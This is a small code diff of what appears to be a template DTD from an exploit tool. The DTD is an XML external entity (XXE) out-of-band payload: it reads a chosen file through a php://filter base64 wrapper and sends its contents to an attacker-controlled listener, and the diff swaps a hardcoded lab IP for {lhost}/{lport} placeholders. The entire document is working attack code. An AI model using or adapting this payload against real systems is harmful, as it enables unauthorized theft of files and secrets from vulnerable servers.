@@ -1,3 +1,3 @@
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={line}">
-<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.15.105:8000/?content=%file;'>">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://{lhost}:{lport}/?content=%file;'>">
 %oob;
